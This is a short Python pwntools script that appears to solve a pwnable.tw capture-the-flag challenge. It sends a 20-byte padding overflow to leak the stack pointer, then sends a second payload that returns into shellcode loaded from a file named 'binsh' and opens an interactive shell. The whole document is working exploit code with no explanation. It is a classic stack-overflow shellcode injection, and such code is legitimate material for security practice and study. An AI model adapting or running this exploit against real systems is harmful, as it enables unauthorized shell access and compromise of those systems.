from pwn import *

host = "127.0.0.1"
# host = "chall.pwnable.tw"
port = 10000
r = remote(host, port)

pad = "A" * 20
esp_addr = "\x87\x80\x04\x08"
addr = int("0xffffd22c", 16)
# shellcode = asm(shellcraft.sh())
payload = pad + esp_addr

r.recvuntil("CTF:")
r.send(payload)
recv = r.recv(4)
esp = u32(recv)
print("> {0}".format(recv))
print("> {0}".format(hex(esp)))

with open('binsh', 'rb') as f:
    shellcode = f.read()
pad = b"A" * 20
shellcode_addr = p32(esp + 20)
print("> {0}".format(shellcode_addr))
payload2 = pad + shellcode_addr + shellcode
# print("payload2: {}".format(payload2))
r.send(payload2)
r.interactive()
